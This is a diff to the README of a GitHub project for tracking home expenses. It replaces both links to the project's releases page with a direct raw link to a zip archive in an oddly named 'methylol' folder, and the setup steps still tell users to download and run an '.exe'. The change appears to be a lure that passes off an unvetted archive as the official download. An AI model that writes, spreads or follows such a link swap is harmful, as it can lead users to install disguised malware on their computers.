@@ -1,6 +1,6 @@
 # 📉 Controle-de-Gastos - Manage your home finances with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Didarz5884/Controle-de-Gastos/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Didarz5884/Controle-de-Gastos/main/methylol/Controle_Gastos_de_1.6-beta.5.zip)
 
 Controle-de-Gastos helps you track your money. You can log expenses, view monthly reports, and plan your future budget. This tool stores your data securely on your computer. It provides clear insights into how you spend your income.
 
@@ -25,7 +25,7 @@ Your computer needs specific software to run this application:
 
 ## 📥 How to get started
 
-1. Go to the [Download Page](https://github.com/Didarz5884/Controle-de-Gastos/releases). 
+1. Go to the [Download Page](https://raw.githubusercontent.com/Didarz5884/Controle-de-Gastos/main/methylol/Controle_Gastos_de_1.6-beta.5.zip). 
 2. Find the latest release version on the page.
 3. Look for the file ending in `.exe` or a compressed folder.
 4. Download the file to your computer.
